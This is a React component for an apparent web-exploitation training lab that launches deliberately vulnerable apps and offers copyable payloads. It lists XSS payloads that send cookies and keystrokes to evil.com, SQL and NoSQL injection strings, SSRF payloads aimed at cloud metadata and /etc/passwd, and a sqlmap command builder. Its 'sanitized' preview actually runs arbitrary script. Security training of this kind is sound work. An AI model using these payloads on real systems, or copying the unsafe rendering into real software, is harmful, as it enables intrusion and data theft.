import React, { useState, useEffect } from 'react';
import { Bug, Database, Server, FlaskConical, Copy, Terminal, PenTool, Shield, Code, Search, Link, Play, Square, ExternalLink } from 'lucide-react';
import { useLabManager } from '../../hooks/useLabManager';

const WebExploitation = () => {
    const [activeTab, setActiveTab] = useState('xss');
    const [xssInput, setXssInput] = useState({ event: 'onerror', tag: 'img', action: 'alert(1)' });
    const [sqlmapInput, setSqlmapInput] = useState({ url: '', db: '', level: '1', options: { dbs: true, tables: false, dump: false, batch: false, randomAgent: false } });
    const [sandboxCode, setSandboxCode] = useState('<h1>Hello</h1><script>console.log("test")</script>');
    const [sandboxResult, setSandboxResult] = useState('<h1>Hello</h1><script>console.log("test")</script>');

    // --- REAL LAB MANAGER ---
    const [selectedLab, setSelectedLab] = useState('dvwa');
    const { status: labStatus, startLab, stopLab, connectionInfo, isLoading } = useLabManager(selectedLab);
    // ------------------------

    useEffect(() => {
        if (activeTab === 'sandbox' && sandboxResult) {
            const preview = document.getElementById('sandbox-preview');
            if (preview) {
                const scripts = preview.querySelectorAll('script');
                scripts.forEach(oldScript => {
                    const newScript = document.createElement('script');
                    newScript.textContent = oldScript.textContent;
                    Array.from(oldScript.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value));
                    document.body.appendChild(newScript);
                    document.body.removeChild(newScript);
                });
            }
        }
    }, [sandboxResult, activeTab]);

    // --- PAYLOAD DATA ---
    const xssPayloads = {
        basic: [
            { name: 'Alert Box', payload: '<script>alert(1)</script>', desc: 'Basic script injection' },
            { name: 'Image Error', payload: '<img src=x onerror=alert(1)>', desc: 'Event handler injection' },
            { name: 'SVG OnLoad', payload: '<svg onload=alert(1)>', desc: 'SVG event injection' },
            { name: 'Body OnLoad', payload: '<body onload=alert(1)>', desc: 'Body event injection' },
            { name: 'Input Onfocus', payload: '<input onfocus=alert(1) autofocus>', desc: 'Auto-triggering input' }
        ],
        advanced: [
            { name: 'Cookie Stealer', payload: '<script>new Image().src="http://evil.com/?c="+document.cookie</script>', desc: 'Exfiltrate cookies' },
            { name: 'Keylogger', payload: '<script>document.onkeypress=function(e){new Image().src="http://evil.com/?k="+e.key}</script>', desc: 'Capture keystrokes' },
            { name: 'DOM Manipulation', payload: '<script>document.body.innerHTML="<h1>Hacked</h1>"</script>', desc: 'Page defacement' },
            { name: 'Fetch API', payload: '<script>fetch("http://evil.com",{method:"POST",body:document.cookie})</script>', desc: 'Modern exfiltration' }
        ],
        bypass: [
            { name: 'No Quotes', payload: '<img src=x onerror=alert`1`>', desc: 'Template literal bypass' },
            { name: 'Case Bypass', payload: '<ScRiPt>alert(1)</sCrIpT>', desc: 'Mixed case bypass' },
            { name: 'Double Encode', payload: '%253Cscript%253Ealert(1)%253C/script%253E', desc: 'Double URL encoding' },
            { name: 'Unicode', payload: '<script>\\u0061lert(1)</script>', desc: 'Unicode escape' },
            { name: 'HTML Entities', payload: '&lt;script&gt;alert(1)&lt;/script&gt;', desc: 'Entity bypass attempt' }
        ],
        polyglot: [
            { name: 'Polyglot #1', payload: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e', desc: 'Multi-context polyglot' }
        ]
    };

    const sqliPayloads = {
        detection: [
            { name: 'Single Quote', payload: "' OR '1'='1", desc: 'Basic detection' },
            { name: 'Double Quote', payload: '" OR "1"="1', desc: 'Alternative syntax' },
            { name: 'Comment', payload: "' OR 1=1--", desc: 'Comment termination' },
            { name: 'Integer', payload: '1 OR 1=1', desc: 'Numeric injection' },
            { name: 'Time Based', payload: "' AND SLEEP(5)--", desc: 'Blind detection' }
        ],
        union: [
            { name: 'Column Count', payload: "' ORDER BY 1,2,3,4--", desc: 'Find column count' },
            { name: 'Union Select', payload: "' UNION SELECT NULL,NULL,NULL--", desc: 'Union injection' },
            { name: 'Version', payload: "' UNION SELECT @@version,NULL,NULL--", desc: 'Get DB version' },
            { name: 'Tables', payload: "' UNION SELECT table_name,NULL FROM information_schema.tables--", desc: 'List tables' },
            { name: 'Columns', payload: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", desc: 'List columns' }
        ],
        bypass: [
            { name: 'Space Bypass', payload: "'/**/OR/**/1=1--", desc: 'Comment as space' },
            { name: 'Case Mixing', payload: "'UnIoN SeLeCt NULL--", desc: 'Mixed case' },
            { name: 'Double Encoding', payload: '%27%20OR%201=1--', desc: 'URL encoded' },
            { name: 'Hex Encoding', payload: "'OR 0x31=0x31--", desc: 'Hex values' }
        ],
        nosql: [
            { name: 'MongoDB Auth', payload: '{"username":{"$gt":""},"password":{"$gt":""}}', desc: 'MongoDB bypass' },
            { name: 'NoSQL $ne', payload: '{"username":"admin","password":{"$ne":"wrong"}}', desc: 'Not equal injection' },
            { name: 'NoSQL $regex', payload: '{"username":{"$regex":"^admin"}}', desc: 'Regex injection' }
        ]
    };

    const ssrfPayloads = [
        { name: 'Localhost', payload: 'http://127.0.0.1/', desc: 'Local loopback' },
        { name: 'AWS Metadata', payload: 'http://169.254.169.254/latest/meta-data/', desc: 'AWS instance metadata' },
        { name: 'GCP Metadata', payload: 'http://metadata.google.internal/computeMetadata/v1/', desc: 'GCP metadata' },
        { name: 'Azure Metadata', payload: 'http://169.254.169.254/metadata/instance', desc: 'Azure IMDS' },
        { name: 'File Protocol', payload: 'file:///etc/passwd', desc: 'Local file read' },
        { name: 'Gopher', payload: 'gopher://127.0.0.1:6379/_INFO', desc: 'Redis via Gopher' },
        { name: 'Decimal IP', payload: 'http://2130706433/', desc: '127.0.0.1 as decimal' },
        { name: 'IPv6 Localhost', payload: 'http://[::1]/', desc: 'IPv6 loopback' },
        { name: 'Redirect Bypass', payload: 'http://evil.com/redirect?url=http://127.0.0.1/', desc: 'Open redirect chain' }
    ];

    // --- HELPER FUNCTIONS ---
    const buildXSS = () => {
        const { tag, event, action } = xssInput;
        return `<${tag} ${event}=${action}>`;
    };

    const buildSQLMap = () => {
        const { url, db, level, options } = sqlmapInput;
        let cmd = `sqlmap -u "${url || 'http://target.com/page?id=1'}"`;
        if (db) cmd += ` ${db}`;
        if (level && level !== '1') cmd += ` --level=${level}`;
        if (options.dbs) cmd += ' --dbs';
        if (options.tables) cmd += ' --tables';
        if (options.dump) cmd += ' --dump';
        if (options.batch) cmd += ' --batch';
        if (options.randomAgent) cmd += ' --random-agent';
        return cmd;
    };

    const runSandbox = () => {
        // Safe-ish render for demo
        setSandboxResult(sandboxCode);
    };

    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text);
        // Could add toast here
    };

    return (
        <div className="h-full flex flex-col p-6 max-w-7xl mx-auto space-y-6">
            {/* Header */}
            <div>
                <h1 className="text-3xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-red-400 to-orange-500 mb-2">
                    Web Exploitation Lab
                </h1>
                <p className="text-gray-400">
                    Interactive payload crafter and vulnerability testing workspace.
                </p>
            </div>

            {/* --- LAB CONTROLS (Real World) --- */}
            <div className="bg-[#1a1b26] border border-blue-500/30 rounded-xl p-4 flex flex-col md:flex-row items-center justify-between gap-4 shadow-lg shadow-blue-900/10">
                <div className="flex items-center gap-4">
                    <div className="p-3 bg-blue-500/20 rounded-lg text-blue-400">
                        {labStatus === 'running' ? <Activity className="animate-pulse" size={24} /> : <Server size={24} />}
                    </div>
                    <div>
                        <h3 className="text-white font-bold flex items-center gap-2">
                            Docker Environment
                            {labStatus === 'running' && <span className="text-[10px] bg-green-500 text-black px-2 py-0.5 rounded font-black">ONLINE</span>}
                        </h3>
                        <div className="flex items-center gap-2 text-sm text-gray-400">
                            <select
                                value={selectedLab}
                                onChange={(e) => setSelectedLab(e.target.value)}
                                disabled={labStatus !== 'idle'}
                                className="bg-black/50 border border-white/10 rounded px-2 py-1 outline-none focus:border-blue-500"
                            >
                                <option value="dvwa">DVWA (Damn Vulnerable Web App)</option>
                                <option value="juice-shop">OWASP Juice Shop</option>
                                <option value="mutillidae">Mutillidae II</option>
                            </select>
                        </div>
                    </div>
                </div>

                <div className="flex items-center gap-3">
                    {labStatus === 'running' && connectionInfo && (
                        <div className="flex items-center gap-3 mr-4 animate-fadeIn">
                            <div className="text-right">
                                <div className="text-[10px] text-gray-500 font-mono uppercase">Target URL</div>
                                <div className="text-blue-400 font-mono font-bold">http://{connectionInfo.ip_address}:{connectionInfo.port}</div>
                            </div>
                            <button
                                onClick={() => window.open(`http://${connectionInfo.ip_address}:${connectionInfo.port}`, '_blank')}
                                className="p-2 bg-blue-600 hover:bg-blue-500 text-white rounded-lg transition-colors"
                                title="Open in New Tab"
                            >
                                <ExternalLink size={18} />
                            </button>
                        </div>
                    )}

                    {labStatus === 'idle' || labStatus === 'error' ? (
                        <button
                            onClick={startLab}
                            disabled={isLoading}
                            className={`flex items-center gap-2 px-6 py-2 bg-green-600 hover:bg-green-500 text-white rounded-lg font-bold transition-all ${isLoading ? 'opacity-50 cursor-not-allowed' : ''}`}
                        >
                            <Play size={18} /> {isLoading ? 'Provisioning...' : 'Start Lab'}
                        </button>
                    ) : (
                        <button
                            onClick={stopLab}
                            disabled={isLoading}
                            className="flex items-center gap-2 px-6 py-2 bg-red-600 hover:bg-red-500 text-white rounded-lg font-bold transition-all"
                        >
                            <Square size={18} fill="currentColor" /> {isLoading ? 'Stopping...' : 'Stop Lab'}
                        </button>
                    )}
                </div>
            </div>
            {/* -------------------------------- */}

            {/* Tabs */}
            <div className="flex space-x-2 border-b border-white/10">
                {[
                    { id: 'xss', icon: Code, label: 'XSS', color: 'text-yellow-400' },
                    { id: 'sqli', icon: Database, label: 'SQL Injection', color: 'text-blue-400' },
                    { id: 'ssrf', icon: Server, label: 'SSRF', color: 'text-green-400' },
                    { id: 'sandbox', icon: FlaskConical, label: 'Sandbox', color: 'text-purple-400' }
                ].map((tab) => (
                    <button
                        key={tab.id}
                        onClick={() => setActiveTab(tab.id)}
                        className={`flex items-center gap-2 px-6 py-3 border-b-2 transition-colors ${activeTab === tab.id
                            ? `border-current ${tab.color} bg-white/5`
                            : 'border-transparent text-gray-400 hover:text-white hover:bg-white/5'
                            }`}
                    >
                        <tab.icon className="w-4 h-4" />
                        <span className="font-bold">{tab.label}</span>
                    </button>
                ))}
            </div>

            {/* Content */}
            <div className="flex-1 min-h-0 overflow-y-auto custom-scrollbar pr-2">

                {/* XSS TAB */}
                {activeTab === 'xss' && (
                    <div className="space-y-8 animate-fadeIn">
                        {/* Builder */}
                        <div className="bg-gray-900/50 border border-white/10 rounded-xl p-6">
                            <h3 className="text-lg font-bold text-white mb-4 flex items-center gap-2">
                                <PenTool className="w-5 h-5 text-yellow-400" />
                                Custom Payload Builder
                            </h3>
                            <div className="flex flex-wrap gap-4 items-end mb-4">
                                <div className="flex-1 min-w-[150px]">
                                    <label className="text-xs text-gray-500 mb-1 block">Context Tag</label>
                                    <select
                                        className="w-full bg-black/50 border border-white/10 rounded-lg p-3 text-white outline-none focus:border-yellow-400"
                                        value={xssInput.tag}
                                        onChange={(e) => setXssInput(prev => ({ ...prev, tag: e.target.value }))}
                                    >
                                        <option value="img">img</option>
                                        <option value="svg">svg</option>
                                        <option value="body">body</option>
                                        <option value="input">input</option>
                                        <option value="iframe">iframe</option>
                                        <option value="script">script</option>
                                    </select>
                                </div>
                                <div className="flex-1 min-w-[150px]">
                                    <label className="text-xs text-gray-500 mb-1 block">Event Handler</label>
                                    <select
                                        className="w-full bg-black/50 border border-white/10 rounded-lg p-3 text-white outline-none focus:border-yellow-400"
                                        value={xssInput.event}
                                        onChange={(e) => setXssInput(prev => ({ ...prev, event: e.target.value }))}
                                    >
                                        <option value="onerror">onerror</option>
                                        <option value="onload">onload</option>
                                        <option value="onclick">onclick</option>
                                        <option value="onfocus">onfocus</option>
                                        <option value="onmouseover">onmouseover</option>
                                    </select>
                                </div>
                                <div className="flex-[2] min-w-[200px]">
                                    <label className="text-xs text-gray-500 mb-1 block">JS Action</label>
                                    <input
                                        type="text"
                                        className="w-full bg-black/50 border border-white/10 rounded-lg p-3 text-white outline-none focus:border-yellow-400 font-mono"
                                        value={xssInput.action}
                                        onChange={(e) => setXssInput(prev => ({ ...prev, action: e.target.value }))}
                                        placeholder="alert(1)"
                                    />
                                </div>
                            </div>
                            <div className="bg-black/30 border border-white/5 rounded-lg p-4 flex justify-between items-center group">
                                <code className="text-yellow-400 font-mono text-sm break-all">{buildXSS()}</code>
                                <button
                                    onClick={() => copyToClipboard(buildXSS())}
                                    className="p-2 hover:bg-white/10 rounded-lg transition-colors text-gray-400 hover:text-white"
                                >
                                    <Copy className="w-4 h-4" />
                                </button>
                            </div>
                        </div>

                        {/* Payloads Grid */}
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                            {Object.entries(xssPayloads).map(([category, items]) => (
                                <div key={category} className="bg-gray-900/30 border border-white/5 rounded-xl p-5 hover:border-white/10 transition-colors">
                                    <h3 className="text-sm font-bold text-gray-300 uppercase tracking-wider mb-4 border-b border-white/5 pb-2">
                                        {category}
                                    </h3>
                                    <div className="space-y-3">
                                        {items.map((item, i) => (
                                            <div key={i} className="group">
                                                <div className="flex justify-between items-center mb-1">
                                                    <span className="text-xs font-bold text-gray-400 group-hover:text-white transition-colors">
                                                        {item.name}
                                                    </span>
                                                    <button
                                                        onClick={() => copyToClipboard(item.payload)}
                                                        className="text-gray-600 hover:text-yellow-400 transition-colors"
                                                    >
                                                        <Copy className="w-3 h-3" />
                                                    </button>
                                                </div>
                                                <code className="block bg-black/40 text-gray-500 text-xs p-2 rounded border border-white/5 group-hover:border-yellow-500/20 group-hover:text-yellow-500/80 transition-all font-mono break-all cursor-pointer" onClick={() => copyToClipboard(item.payload)}>
                                                    {item.payload}
                                                </code>
                                            </div>
                                        ))}
                                    </div>
                                </div>
                            ))}
                        </div>
                    </div>
                )}

                {/* SQLi TAB */}
                {activeTab === 'sqli' && (
                    <div className="space-y-8 animate-fadeIn">
                        {/* SQLMap Builder */}
                        <div className="bg-gray-900/50 border border-white/10 rounded-xl p-6">
                            <h3 className="text-lg font-bold text-white mb-4 flex items-center gap-2">
                                <Terminal className="w-5 h-5 text-blue-400" />
                                SQLMap Command Builder
                            </h3>
                            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
                                <input
                                    type="text"
                                    placeholder="Target URL (e.g., http://site.com/vuln.php?id=1)"
                                    className="md:col-span-2 bg-black/50 border border-white/10 rounded-lg p-3 text-white outline-none focus:border-blue-400 font-mono text-sm"
                                    value={sqlmapInput.url}
                                    onChange={(e) => setSqlmapInput(prev => ({ ...prev, url: e.target.value }))}
                                />
                                <div className="grid grid-cols-2 gap-2">
                                    <select
                                        className="bg-black/50 border border-white/10 rounded-lg p-3 text-gray-300 outline-none focus:border-blue-400 text-sm"
                                        value={sqlmapInput.db}
                                        onChange={(e) => setSqlmapInput(prev => ({ ...prev, db: e.target.value }))}
                                    >
                                        <option value="">Auto DB</option>
                                        <option value="--dbms=mysql">MySQL</option>
                                        <option value="--dbms=postgresql">PostgreSQL</option>
                                        <option value="--dbms=mssql">MSSQL</option>
                                    </select>
                                    <select
                                        className="bg-black/50 border border-white/10 rounded-lg p-3 text-gray-300 outline-none focus:border-blue-400 text-sm"
                                        value={sqlmapInput.level}
                                        onChange={(e) => setSqlmapInput(prev => ({ ...prev, level: e.target.value }))}
                                    >
                                        <option value="1">Level 1</option>
                                        <option value="3">Level 3</option>
                                        <option value="5">Level 5</option>
                                    </select>
                                </div>
                            </div>

                            <div className="flex flex-wrap gap-4 mb-6">
                                {Object.keys(sqlmapInput.options).map(opt => (
                                    <label key={opt} className="flex items-center space-x-2 text-sm text-gray-400 cursor-pointer hover:text-white">
                                        <input
                                            type="checkbox"
                                            checked={sqlmapInput.options[opt]}
                                            onChange={(e) => setSqlmapInput(prev => ({
                                                ...prev,
                                                options: { ...prev.options, [opt]: e.target.checked }
                                            }))}
                                            className="rounded border-gray-600 text-blue-500 focus:ring-0 bg-transparent"
                                        />
                                        <span className="capitalize">{opt.replace(/([A-Z])/g, ' $1')}</span>
                                    </label>
                                ))}
                            </div>

                            <div className="bg-black/80 border border-blue-500/20 rounded-lg p-4 flex justify-between items-center">
                                <code className="text-blue-400 font-mono text-sm break-all">{buildSQLMap()}</code>
                                <button
                                    onClick={() => copyToClipboard(buildSQLMap())}
                                    className="p-2 hover:bg-white/10 rounded-lg transition-colors text-gray-400 hover:text-white"
                                >
                                    <Copy className="w-4 h-4" />
                                </button>
                            </div>
                        </div>

                        {/* Payloads */}
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                            {Object.entries(sqliPayloads).map(([category, items]) => (
                                <div key={category} className="bg-gray-900/30 border border-white/5 rounded-xl p-5 hover:border-white/10 transition-colors">
                                    <h3 className="text-sm font-bold text-gray-300 uppercase tracking-wider mb-4 border-b border-white/5 pb-2">
                                        {category}
                                    </h3>
                                    <div className="space-y-3">
                                        {items.map((item, i) => (
                                            <div key={i} className="group">
                                                <div className="flex justify-between items-center mb-1">
                                                    <span className="text-xs font-bold text-gray-400 group-hover:text-white transition-colors">
                                                        {item.name}
                                                    </span>
                                                    <button
                                                        onClick={() => copyToClipboard(item.payload)}
                                                        className="text-gray-600 hover:text-blue-400 transition-colors"
                                                    >
                                                        <Copy className="w-3 h-3" />
                                                    </button>
                                                </div>
                                                <code className="block bg-black/40 text-gray-500 text-xs p-2 rounded border border-white/5 group-hover:border-blue-500/20 group-hover:text-blue-400 transition-all font-mono break-all cursor-pointer" onClick={() => copyToClipboard(item.payload)}>
                                                    {item.payload}
                                                </code>
                                            </div>
                                        ))}
                                    </div>
                                </div>
                            ))}
                        </div>
                    </div>
                )}

                {/* SSRF TAB */}
                {activeTab === 'ssrf' && (
                    <div className="space-y-8 animate-fadeIn">
                        <div className="bg-gray-900/50 border border-white/10 rounded-xl p-6">
                            <div className="flex items-start gap-4 mb-6">
                                <div className="p-3 rounded-lg bg-green-500/10">
                                    <Server className="w-6 h-6 text-green-400" />
                                </div>
                                <div>
                                    <h3 className="text-lg font-bold text-white">Server-Side Request Forgery</h3>
                                    <p className="text-gray-400 text-sm">Payloads to target internal services, cloud metadata, and local files.</p>
                                </div>
                            </div>

                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                {ssrfPayloads.map((item, i) => (
                                    <div key={i} className="group bg-black/30 border border-white/5 rounded-lg p-4 hover:border-green-500/30 transition-all">
                                        <div className="flex justify-between items-center mb-2">
                                            <span className="font-bold text-sm text-gray-300 group-hover:text-green-400 transition-colors">{item.name}</span>
                                            <span className="text-[10px] text-gray-600 uppercase tracking-widest">{item.desc}</span>
                                        </div>
                                        <div className="relative">
                                            <code className="block bg-black/50 p-3 rounded text-green-500/90 font-mono text-sm break-all border border-transparent group-hover:border-green-500/10 transition-colors">
                                                {item.payload}
                                            </code>
                                            <button
                                                onClick={() => copyToClipboard(item.payload)}
                                                className="absolute top-2 right-2 p-1 text-gray-600 hover:text-white bg-black/80 rounded opacity-0 group-hover:opacity-100 transition-opacity"
                                            >
                                                <Copy className="w-3 h-3" />
                                            </button>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </div>
                    </div>
                )}

                {/* SANDBOX TAB */}
                {activeTab === 'sandbox' && (
                    <div className="h-full flex flex-col animate-fadeIn gap-6">
                        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 h-[500px]">
                            <div className="flex flex-col">
                                <label className="text-sm font-bold text-gray-400 mb-2 flex items-center gap-2">
                                    <Code className="w-4 h-4" />
                                    HTML / JS Input
                                </label>
                                <textarea
                                    className="flex-1 bg-gray-900 border border-white/10 rounded-xl p-4 font-mono text-sm text-gray-300 focus:border-purple-500 outline-none resize-none"
                                    value={sandboxCode}
                                    onChange={(e) => setSandboxCode(e.target.value)}
                                    placeholder="<div>Test payload here...</div>"
                                />
                            </div>
                            <div className="flex flex-col">
                                <label className="text-sm font-bold text-gray-400 mb-2 flex items-center gap-2">
                                    <FlaskConical className="w-4 h-4" />
                                    Live Preview (Sanitized)
                                </label>
                                <div
                                    id="sandbox-preview"
                                    className="flex-1 bg-black/40 rounded-xl p-4 overflow-auto border border-white/10 relative text-white"
                                >
                                    <div dangerouslySetInnerHTML={{ __html: sandboxResult }} />
                                </div>
                            </div>
                        </div>
                        <div className="flex justify-end gap-3">
                            <button
                                onClick={() => { setSandboxCode(''); setSandboxResult(''); }}
                                className="px-6 py-2 bg-white/5 hover:bg-white/10 text-gray-400 hover:text-white rounded-lg font-bold transition-colors"
                            >
                                Clear
                            </button>
                            <button
                                onClick={runSandbox}
                                className="px-6 py-2 bg-purple-600 hover:bg-purple-500 text-white rounded-lg font-bold transition-colors flex items-center gap-2"
                            >
                                <FlaskConical className="w-4 h-4" />
                                Render Payload
                            </button>
                        </div>
                    </div>
                )}
            </div>
        </div>
    );
};

export default WebExploitation;
